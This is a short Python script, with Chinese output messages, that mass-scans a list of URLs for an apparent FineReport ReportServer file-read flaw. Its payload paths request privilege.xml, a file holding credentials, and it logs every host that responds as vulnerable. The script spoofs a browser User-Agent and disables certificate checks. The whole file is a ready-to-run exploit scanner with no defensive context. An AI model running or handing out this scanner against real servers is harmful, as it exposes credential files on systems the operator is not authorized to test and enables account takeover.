
import json
import requests


urls = open('url.txt')

pocs = ['/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml',
       '/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml'
       ]
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
}

for i in urls:
    url = i.rstrip("\n")
    for poc in pocs:
        vulnurl = url + poc
        try:
            req = requests.post(vulnurl,headers=headers, timeout=3, verify=False)
            if req.status_code == 200:
                if '![CDATA[___' in req.text:
                    print("\n\033[1;32m[+]存在漏洞\tpayload:\033[0m",vulnurl)
                    with open('漏洞.txt', 'a')as f:
                        f.write(str(vulnurl) + '\n')
                else:
                    print("\n\033[1;31m[-]不存在漏洞\033[0m", vulnurl)
            else:
                print("\n\033[1;31m[-]不存在漏洞\033[0m",vulnurl)

        except:
            print('\n\033[1;31m[-]响应超时..............\033[0m')
            pass


